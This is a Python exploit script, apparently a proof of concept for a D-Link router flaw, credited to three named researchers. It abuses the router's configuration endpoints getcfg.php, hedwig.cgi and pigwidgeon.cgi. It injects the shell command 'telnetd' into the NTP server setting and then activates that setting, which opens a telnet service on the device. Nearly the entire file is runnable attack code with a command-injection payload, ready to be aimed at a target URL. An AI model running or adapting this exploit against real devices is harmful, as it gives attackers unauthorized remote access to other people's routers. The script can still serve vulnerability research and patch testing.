# -*- coding:utf-8 -*-
# Acknowledgement
# Thanks to the partners who discovered the vulnerability together：
# Wei Xie
# Zhen-hua Wang
# En-Ze Wang

import requests, os
from lxml import etree
from traceback import print_exc
try:
    from urllib.parse import urljoin
except:
    from urlparse import urljoin
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import re

url = 'https://xxx/'
print("Exploit continuing...")
COMMAND = 'telnetd'
uid = 'r311UuYul4'         ###update it!!!!!
proxy = {}#{"http":"http://127.0.0.1:8080"}
session = requests.Session()
session.verify = False
session.cookies.update({"uid": uid})
################get DEVICE.TIME###############################
try:
    headers = {"Accept":"*/*","Cache-Control":"no-cache","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0","Referer":urljoin(url, "/tools_time.php"),"Connection":"keep-alive","Accept-Language":"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3","Accept-Encoding":"gzip, deflate","Pragma":"no-cache","Content-Type":"application/x-www-form-urlencoded"}
    res = session.post(urljoin(url,'/getcfg.php'),data={"SERVICES":"DEVICE.TIME"}, proxies=proxy, headers=headers)
    # print(res.content)
    tree = etree.fromstring(res.content)
    tree.xpath("//ntp/enable")[0].text = "1"
    tree.xpath("//ntp/server")[0].text = "ntp1.dlink.com; (" + COMMAND + ") & exit; "
    tree.xpath("//ntp6/enable")[0].text = "1"
    # print(data)
except:
    print_exc()
    pass
# exit()
#################POST hedwig.cgi###############################
print("hedwig")
headers = {"Content-Type": "text/xml"}
data = etree.tostring(tree)
resp = session.post(urljoin(url, "/hedwig.cgi"), headers=headers, data=data, proxies=proxy)
# print(resp.text)
try:
    tree = etree.fromstring(resp.content)
    result = tree.findtext("result")
    if result.lower() != "ok":
        print("Failed!")
        print(resp.text)
        exit()
    print("OK")
except:
    print("error!")
###############POST pigwidgeon.cgi##############################
print("pigwidgeon")
data = {"ACTIONS": "SETCFG,ACTIVATE"}
resp = session.post(urljoin(url, "/pigwidgeon.cgi"), data=data, proxies=proxy)
# print(resp.text)
tree = etree.fromstring(resp.content)
result = tree.findtext("result")
if result.lower() != "ok":
    print("Failed!")
    print(resp.text)
    exit()
print("OK")
